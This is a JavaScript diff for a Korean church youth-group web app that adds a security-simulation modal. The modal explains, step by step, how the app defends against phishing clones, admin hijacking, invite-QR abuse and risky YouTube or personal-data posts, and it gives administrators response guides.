+            title: '2단계 · 앱 최상단 빨간 경고 배너 즉시 고정 표시',
+            badge: detectOn ? '경고 배너 노출' : '미표시',
+            body: '이용자가 비밀번호를 입력하거나 조작하기 전에 화면 최상단에 빨간 피싱·복제 주의 배너를 띄워 즉시 알아차리게 합니다.'
+          },
+          {
+            status: 'ok',
+            title: '3단계 · CSP HTTPS 강제 & 자동 보안 점검 탐지',
+            badge: '이중 방어',
+            body: 'CSP의 upgrade-insecure-requests가 비암호화 요청을 HTTPS로 자동 승격하며, 1번 보안 진단(공식 도메인·HTTPS)이 즉시 🚨 위험으로 감지해 자동 점검을 멈추고 관리자에게 알립니다.'
+          },
+          {
+            status: 'ok',
+            title: '4단계 · 비공식 도메인 접속 감사 로그 자동 기록',
+            badge: '증거 기록',
+            body: `로그인 상태에서 비공식 주소 접속이 감지되면 [${logLbl}]에 '비공식 도메인 접속 감지'와 전체 URL이 자동 기록됩니다.`
+          }
+        ];
+
+        previewHtml = `
+          <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 이용자 화면 최상단에 즉시 뜨는 실제 경고 배너</div>
+          <div style="background:linear-gradient(90deg, #991B1B 0%, #DC2626 100%); color:#fff; border-radius:10px; padding:9px 11px; font-size:11.5px; font-weight:800; line-height:1.45;">
+            🚨 피싱·복제 주의 (${escapeHtml(issues.join(' · '))}) · 공식 주소(${escapeHtml(officialHost)})인지 확인하세요!
+          </div>
+        `;
+
+        responseGuide = [
+          '청년부 단체방에 공식 주소(https://' + officialHost + '/youth-app/)만 이용하도록 즉시 공지합니다.',
+          '피싱 링크에서 비밀번호를 입력했을 가능성이 있는 회원은 [👥 회원 승인]에서 비밀번호 초기화를 진행합니다.',
+          '관리자가 비공식 주소에서 로그인했을 경우 즉시 [🔐 관리자 코드]를 새 코드로 변경합니다.'
+        ];
+      } else if (scenarioId === 'admin_hijack') {
+        const lockOn = !!(adminRegistry && adminRegistry.lockAutoRegister);
+        const activeAdmins = (adminRegistry && Array.isArray(adminRegistry.items) ? adminRegistry.items : []).filter(a => a.status === 'active').length;
+        const isVariant0 = vIdx === 0;
+
+        if (isVariant0 && !lockOn) {
+          overallStatus = 'warn';
+          overallBadge = '⚠️ 신규 관리자 자동 등록 잠금 OFF (즉시 켜기 권장)';
+          fixAction = { label: '🔒 자동 등록 잠금 즉시 켜기', type: 'enable_admin_lock' };
+        }
+
+        if (isVariant0) {
+          steps = [
+            {
+              status: lockOn ? 'ok' : 'warn',
+              title: `1단계 · 신규 관리자 자동 등록 잠금 (${lockOn ? 'ON · 무단 입장 차단' : 'OFF · 위험'})`,
+              badge: lockOn ? '승인 대기 격리' : '잠금 꺼짐',
+              body: lockOn
+                ? `현재 등록된 활성 관리자(${activeAdmins}명) 외 낯선 성명('외부침입자')은 올바른 코드를 알아도 즉시 관리 화면에 들어오지 못하고 [승인 대기] 상태에 갇힙니다.`
+                : '현재 잠금이 꺼져 있어 관리자 코드가 유출되면 낯선 이름으로도 바로 관리자로 등록될 수 있습니다. 지금 바로 잠금을 켜는 것을 권장합니다.'
+            },
+            {
+              status: 'ok',
+              title: '2단계 · 기존 관리자 실시간 알림 & 빨간 배지 표시',
+              badge: '즉시 통보',
+              body: `낯선 관리자가 입장 승인을 요청하는 순간, 기존 최고 관리자에게 '👑 새 관리자 입장 승인 요청' 알림과 [${admLbl}] 탭 빨간 배지가 즉시 뜹니다.`
+            },
+            {
+              status: 'ok',
+              title: '3단계 · 원클릭 거절 및 강제 로그아웃',
+              badge: '즉시 축출',
+              body: `기존 관리자가 [${admLbl}]에서 [거절] 또는 [해제]를 누르는 즉시 침입자의 세션이 실시간으로 차단되어 앱에서 튕겨 나갑니다.`
+            }
+          ];
+          previewHtml = `
+            <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 침입자 화면 반응 (${lockOn ? '잠금 ON 상태' : '잠금 OFF 시 주의'})</div>
+            ${lockOn
+              ? `<div style="background:#FFFBEB; border:1.5px solid #FCD34D; border-radius:10px; padding:10px 11px; color:#92400E; font-size:11.5px; line-height:1.5;">
+                  <b>⏳ 관리자 입장 승인 대기 중</b><br>
+                  신규 관리자 자동 등록 잠금이 켜져 있습니다. 기존 최고 관리자가 <b>[${escapeHtml(admLbl)}]</b>에서 승인하기 전까지 관리 화면에 접근할 수 없습니다.
+                </div>`
+              : `<div style="background:#FEF2F2; border:1.5px solid #FCA5A5; border-radius:10px; padding:10px 11px; color:#991B1B; font-size:11.5px; line-height:1.5;">
+                  <b>⚠️ 자동 등록 잠금이 꺼져 있습니다!</b><br>
+                  코드가 유출될 경우 낯선 이름으로도 입장될 수 있습니다. 아래 <b>[🔒 자동 등록 잠금 즉시 켜기]</b>로 방어를 강화해 주세요.
+                </div>`}
+          `;
+        } else {
+          steps = [
+            {
+              status: 'ok',
+              title: '1단계 · UI 버튼 및 참관자 읽기 전용 잠금',
+              badge: '1차 차단',
+              body: '일반 회원은 관리 탭 자체가 숨겨지며, 참관자 역할은 모든 추가·수정·삭제·승인 버튼과 [🔐 관리자 코드] 탭이 원천 비활성화됩니다.'
+            },
+            {
+              status: 'ok',
+              title: '2단계 · Firestore 서버 보안 규칙 거부 (permission-denied)',
+              badge: '서버 강제 차단',
+              body: '해커가 브라우저 개발자 도구로 코드를 변조해 DB에 직접 요청해도, Firebase 서버가 로그인 토큰(admin@right-youth.app)을 검증해 쓰기·삭제 및 민감 문서(adminSecret·sheetSecret) 조회를 즉시 거부합니다.'
+            },
+            {
+              status: 'ok',
+              title: '3단계 · 비공개·예약 데이터 서버 컬렉션 물리 격리',
+              badge: '데이터 격리',
+              body: '임시저장·예약·관리자 전용 공지와 배너는 별도 컬렉션(adminNotices·adminBlocks)에 격리 보관되어 일반 회원 기기로는 패킷조차 전송되지 않습니다.'
+            }
+          ];
+          previewHtml = `
+            <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 무단 API 호출 시 Firebase 서버 응답</div>
+            <div style="background:#0F172A; color:#FCA5A5; border-radius:10px; padding:9px 11px; font-size:11.5px; font-family:ui-monospace, monospace; line-height:1.5;">
+              FirebaseError: [code=permission-denied]<br>
+              Missing or insufficient permissions. (서버에서 요청 영구 거부됨)
+            </div>
+          `;
+        }
+
+        responseGuide = [
+          `[${admLbl}]에서 '신규 관리자 자동 등록 잠금'을 항상 ON 상태로 유지합니다.`,
+          `코드 유출이 의심되면 즉시 [${codeLbl}]에서 영문+숫자 8자 이상 새 코드로 변경합니다.`,
+          `낯선 입장 요청이 보이면 [${admLbl}]에서 즉시 거절하고 [${logLbl}]에서 시도 시각을 확인합니다.`
+        ];
+      } else if (scenarioId === 'qr_brute') {
+        const modeMin = getInviteRefreshMinutes(inviteQrDoc);
+        const modeLabel = modeMin > 0 ? `${modeMin}분 자동 갱신 + 유예 ${getInviteGraceMinutes(modeMin)}분` : '매일 자정(00:00) 자동 갱신';
+        const hasValidQr = !!(inviteQrDoc && inviteQrDoc.token);
+
+        if (!hasValidQr) {
+          overallStatus = 'warn';
+          overallBadge = '⚠️ 현재 초대 QR 미생성 (재발급 권장)';
+          fixAction = { label: '📲 QR 관리 열기', type: 'subtab', param: 'qr' };
+        }
+
+        steps = [
+          {
+            status: hasValidQr ? 'ok' : 'warn',
+            title: `1단계 · 실시간 초대 QR 토큰·유효시간 대조 (${modeLabel})`,
+            badge: '즉시 검증',
+            body: `회원가입 화면 진입 시 URL의 invite 토큰을 서버(config/inviteQr)의 현재 유효 토큰 및 만료 시각(KST)과 실시간 비교합니다.`
+          },
+          {
+            status: 'ok',
+            title: '2단계 · 회원가입 입력 폼 자체 잠금 (signupQrLockBox)',
+            badge: '접근 차단',
+            body: '토큰이 없거나 만료·위조된 경우 이름·역할·비밀번호 입력칸을 아예 숨기고 빨간 잠금 안내 화면만 띄워 가입 제출 자체를 봉쇄합니다.'
+          },
+          {
+            status: 'ok',
+            title: '3단계 · 가입 신청 후에도 최고 관리자 수동 승인 필수',
+            badge: '이중 승인 관문',
+            body: '설령 유효한 QR이 외부에 유출되어 가입 신청이 접수되더라도 status: "pending" 상태로 격리되며, 최고 관리자가 [👥 회원 승인]에서 직접 승인하기 전까지 앱 내부 데이터에 절대 접근할 수 없습니다.'
+          }
+        ];
+
+        const lockTitle = vIdx === 0 ? '초대 QR 유효시간이 만료되었습니다' : (vIdx === 1 ? '유효하지 않은 초대 QR 코드입니다' : '초대 QR 코드가 필요합니다');
+        previewHtml = `
+          <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 외부인에게 표시되는 실제 회원가입 잠금 화면</div>
+          <div style="background:#FEF2F2; border:1.5px solid #FECACA; border-radius:12px; padding:12px; text-align:center; color:#991B1B; font-size:11.5px; line-height:1.5;">
+            <div style="font-size:20px; margin-bottom:4px;">🔒</div>
+            <div style="font-weight:800; font-size:12.5px; margin-bottom:3px;">${escapeHtml(lockTitle)}</div>
+            <div>청년부원 또는 관리자가 공유한 <b>현재 유효한 초대 QR 코드</b>를 다시 스캔해 접속해 주세요.</div>
+          </div>
+        `;
+
+        responseGuide = [
+          '공개 공간에 QR 이미지가 유출된 경우 [📲 QR 관리]에서 [🔄 새 QR 즉시 재발급]을 누르면 기존 QR이 1초 만에 폐기됩니다.',
+          '행사가 끝난 뒤에는 QR 자동 갱신 주기를 [5분] 또는 [10분]으로 설정해 두면 유출 위험을 크게 줄일 수 있습니다.',
+          '모르는 사람의 가입 신청이 들어오면 [👥 회원 승인]에서 [보류] 또는 [삭제] 처리합니다.'
+        ];
+      } else {
+        // yt_pii
+        const isPii = vIdx === 2;
+        if (isPii) {
+          const piiRes = detectSensitivePii(variant.payload);
+          steps = [
+            {
+              status: 'ok',
+              title: '1단계 · 문의 작성 시 개인정보 입력 주의 안내',
+              badge: '사전 예방',
+              body: '이용자 문의 작성창 상단에 전화번호·주소 등 민감 개인정보 미기재 안내를 고정 표시해 오기입을 예방합니다.'
+            },
+            {
+              status: 'ok',
+              title: '2단계 · 8번 보안 진단(개인정보 노출 스캔) 실시간 탐지',
+              badge: `${piiRes.reasons.length}종 패턴 검출`,
+              body: `실제 스캔 엔진(detectSensitivePii)이 [${piiRes.reasons.join(', ')}] 패턴을 즉시 탐지합니다. 주민등록번호·카드번호 같은 고위험 정보는 🚨 위험(err)으로 즉시 분류됩니다.`
+            },
+            {
+              status: 'ok',
+              title: '3단계 · 자동 보안 점검 일시 정지 & 관리자 즉시 알림',
+              badge: '자동 경보',
+              body: '고위험 개인정보(주민번호·카드번호)가 감지되면 실시간 자동 보안 점검이 즉시 멈추고 최고 관리자에게 알림과 빨간 배지를 띄워 빠르게 삭제·수정할 수 있게 안내합니다.'
+            }
+          ];
+          previewHtml = `
+            <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 8번 보안 진단 자동 탐지 결과 미리보기</div>
+            <div style="background:#FEF2F2; border-left:4px solid #EF4444; border-radius:9px; padding:9px 11px; color:#7F1D1D; font-size:11.5px; line-height:1.5;">
+              <b>🚨 위험 · 개인정보 노출 감지</b><br>
+              • 탐지 항목: ${escapeHtml(piiRes.reasons.join(' · '))}<br>
+              • 조치: 해당 문의/공지 탭으로 바로 이동해 민감 정보를 수정·삭제하세요.
+            </div>
+          `;
+          responseGuide = [
+            '8번 보안 진단 카드의 바로가기 버튼을 눌러 민감 정보가 포함된 문의·게시물로 이동합니다.',
+            '주민등록번호·카드번호·개인 휴대전화번호를 즉시 삭제하거나 마스킹 처리합니다.',
+            '교회 공식 대표 연락처 등 의도된 공지인 경우에만 [✅ 공식 연락처 확인 완료]로 주의를 해제합니다.'
+          ];
+        } else {
+          const isBadDomain = vIdx === 1;
+          const kwHits = YOUTUBE_RISK_KEYWORDS.filter(k => variant.payload.toLowerCase().includes(k.toLowerCase()));
+          steps = [
+            {
+              status: 'ok',
+              title: '1단계 · 유튜브 공식 도메인 · 영상 ID 무결성 검증',
+              badge: isBadDomain ? '즉시 차단' : '통과',
+              body: isBadDomain
+                ? 'youtube.com / youtu.be 공식 도메인이 아닌 피싱·위장 주소(youtube-free-event.xyz)를 1단계에서 즉시 차단하고 감사 로그에 기록합니다.'
+                : '유튜브 공식 도메인과 11자리 영상 ID 형식을 확인한 뒤 2단계로 넘깁니다.'
+            },
+            {
+              status: 'ok',
+              title: '2단계 · 유튜브 서버 실존 여부 & 원본 채널명 조회',
+              badge: isBadDomain ? '차단으로 중단' : '실존 검증',
+              body: '유튜브 oEmbed 메타 조회로 실제 존재하는 영상인지와 업로드한 진짜 채널명을 자동 추출합니다. (사용자가 채널명을 거짓으로 속일 수 없음)'
+            },
+            {
+              status: 'ok',
+              title: '3단계 · 저작권·도박·성인 위험 키워드 자동 필터링',
+              badge: kwHits.length > 0 ? `${kwHits.length}개 키워드 감지` : '위험 문구 검사',
+              body: kwHits.length > 0
+                ? `제목·추천글에서 저작권/위험 키워드 [${kwHits.join(', ')}]를 감지해 자동 게시를 막고 즉시 경고·차단합니다.`
+                : '무단·음원 추출·1시간 연속듣기·도박·성인 키워드를 자동 검사해 위험 영상 유입을 차단합니다.'
+            },
+            {
+              status: 'ok',
+              title: `4단계 · 공식 채널(${officialYtChannels.length}곳) 화이트리스트 대조`,
+              badge: '미등록 채널 격리',
+              body: '등록된 공식 채널 외 미등록 채널 영상은 회원 화면에 절대 바로 올라가지 않고 [🎬 영상 관리] 검토 대기 목록에 격리되어 관리자 승인 후에만 공개됩니다.'
+            }
+          ];
+          previewHtml = `
+            <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 유튜브 등록 4단계 검사 결과 미리보기</div>
+            <div style="background:#FEF2F2; border:1px solid #FCA5A5; border-radius:10px; padding:9px 11px; color:#991B1B; font-size:11.5px; line-height:1.5;">
+              <b>🚨 등록 차단됨</b><br>
+              ${isBadDomain
+                ? '• 사유: 유튜브 공식 주소(youtube.com, youtu.be)가 아닌 의심 도메인입니다.<br>• 조치: 등록 즉시 거부 + 감사 로그 기록'
+                : `• 감지 키워드: ${escapeHtml(kwHits.join(', '))}<br>• 조치: 저작권·위험 문구 포함으로 자동 게시 차단`}
+            </div>
+          `;
+          responseGuide = [
+            '공식 교회·찬양팀 채널은 [🎬 영상 관리 → 공식 채널]에 등록해 [🔍 자동검사]로 고유 ID(UC...)를 연결해 둡니다.',
+            '미등록 채널 추천 영상이 대기 목록에 올라오면 썸네일과 원본 채널명을 확인한 뒤 승인 또는 거절합니다.',
+            '10번 보안 진단이 게시 완료된 영상의 위험 문구와 공식 채널 무결성을 주기적으로 재검증합니다.'
+          ];
+        }
+      }
+
+      return { sc, vIdx, variant, overallStatus, overallBadge, steps, previewHtml, responseGuide, fixAction };
+    }
+
+    window.openSecSimModal = (scenarioId = 'xss', variantIdx = 0) => {
+      const res = evaluateSecSimScenario(scenarioId, variantIdx);
+      const { sc, vIdx, variant, overallStatus, overallBadge, steps, previewHtml, responseGuide, fixAction } = res;
+      const u = getCurrentUser();
+      const canFix = !!(u && u.isSuperAdmin);
+
+      document.getElementById('diagSimModalTitle').textContent = `${sc.icon} ${sc.title}`;
+      document.getElementById('diagSimModalBody').innerHTML = `
+        <div style="font-size:12px; color:#475569; line-height:1.48; margin-bottom:9px;">
+          ${escapeHtml(sc.subtitle)}
+        </div>
+
+        <div style="margin-bottom:9px;">
+          <div style="font-size:11.5px; font-weight:800; color:#334155; margin-bottom:5px;">⚔️ 모의 공격 유형 선택</div>
+          <div class="filter-row" style="margin-bottom:0;">
+            ${sc.variants.map((v, idx) => `
+              <button class="filter-chip ${idx === vIdx ? 'active' : ''}" type="button" onclick="selectSecSimVariant('${escapeJsAttr(sc.id)}', ${idx})">${escapeHtml(v.label)}</button>
+            `).join('')}
+          </div>
+        </div>
+
+        <div style="display:flex; align-items:center; justify-content:space-between; gap:6px; flex-wrap:wrap; margin-top:8px;">
+          <span style="font-size:11.5px; font-weight:800; color:#991B1B;">🎯 공격 시도 (${escapeHtml(variant.context)})</span>
+          <span class="tag ${overallStatus === 'ok' ? 'green' : 'warm'}">${escapeHtml(overallBadge)}</span>
+        </div>
+        <div class="sec-sim-payload">${escapeHtml(variant.payload)}</div>
+
+        <div style="font-size:12px; font-weight:800; color:#0F172A; margin:10px 0 6px;">🛡️ 내 웹 앱의 단계별 실시간 방어 대처</div>
+        ${steps.map(st => `
+          <div class="sec-sim-step ${st.status}">
+            <div class="sec-sim-step-title">
+              <span>${escapeHtml(st.title)}</span>
+              <span class="tag ${st.status === 'ok' ? 'green' : (st.status === 'warn' ? 'warm' : 'red')}" style="font-size:10px;">${escapeHtml(st.badge)}</span>
+            </div>
+            <div>${escapeHtml(st.body)}</div>
+          </div>
+        `).join('')}
+
+        <div class="sec-sim-preview">${previewHtml}</div>
+
+        <div class="info-box" style="margin-top:8px; margin-bottom:10px;">
+          <b>📋 실제 발생 시 관리자 대응 가이드</b><br>
+          ${responseGuide.map((g, i) => `${i + 1}. ${escapeHtml(g)}`).join('<br>')}
+        </div>
+
+        <div style="display:flex; gap:8px; flex-wrap:wrap;">
+          ${(fixAction && canFix)
+            ? `<button class="btn-full btn-amber" type="button" style="flex:1; padding:11px; font-size:13px;" onclick="document.getElementById('diagSimModal').classList.remove('open'); runCheckAdviceAction('${escapeJsAttr(fixAction.type)}', '${escapeJsAttr(fixAction.param || '')}')">${escapeHtml(fixAction.label)}</button>`
+            : ''}
+          <button class="btn-outline" type="button" style="flex:1; padding:11px;" onclick="document.getElementById('diagSimModal').classList.remove('open')">닫기</button>
+        </div>
+      `;
+      document.getElementById('diagSimModal').classList.add('open');
+    };
+
+    window.selectSecSimVariant = (scenarioId, variantIdx) => {
+      openSecSimModal(scenarioId, variantIdx);
+    };
+
+    window.runAllSecSimulations = () => {
+      const ids = ['xss', 'phishing', 'clone', 'admin_hijack', 'qr_brute', 'yt_pii'];
+      const results = ids.map(id => evaluateSecSimScenario(id, 0));
+      const okCnt = results.filter(r => r.overallStatus === 'ok').length;
+      const warnCnt = results.length - okCnt;
+
+      document.getElementById('diagSimModalTitle').textContent = '🚀 전체 6종 공격 방어 모의 테스트 결과';
+      document.getElementById('diagSimModalBody').innerHTML = `
+        <div class="info-box ${warnCnt > 0 ? 'warn' : ''}" style="margin-top:0; margin-bottom:11px;">
+          <b>${warnCnt === 0 ? `✅ 전체 ${results.length}종 모의 공격 모두 완전 방어 확인!` : `⚠️ ${okCnt}/${results.length}종 완전 방어 · ${warnCnt}종 방어 설정 보강 권장`}</b><br>
+          현재 앱에 켜진 실시간 방어 스위치·CSP 헤더·관리자 잠금·QR 상태를 기준으로 모의 공격을 실행한 결과입니다. 각 항목을 눌러 상세 단계와 화면 반응을 확인해 보세요.
+        </div>
+        ${results.map(r => `
+          <div class="sec-sim-step ${r.overallStatus}" style="cursor:pointer;" onclick="openSecSimModal('${escapeJsAttr(r.sc.id)}', 0)">
+            <div class="sec-sim-step-title">
+              <span>${r.sc.icon} ${escapeHtml(r.sc.title)}</span>
+              <span class="tag ${r.overallStatus === 'ok' ? 'green' : 'warm'}" style="font-size:10.5px;">${escapeHtml(r.overallBadge)}</span>
+            </div>
+            <div style="font-size:11.5px; opacity:0.9;">
+              • 테스트: ${escapeHtml(r.variant.label)} → <b>탭해서 상세 방어 과정 보기 ▸</b>
+            </div>
+          </div>
+        `).join('')}
+        <button class="btn-full btn-dark" type="button" style="margin-top:8px; padding:11px;" onclick="document.getElementById('diagSimModal').classList.remove('open')">확인 · 닫기</button>
+      `;
+      document.getElementById('diagSimModal').classList.add('open');
+    };
 
     // ==================== 23. 이용자 설정 화면 · 전체 글자 크기 · 스마트 업데이트 · 관리자 보안 알림 ====================
     window.setAppFontScale = (scale) => {
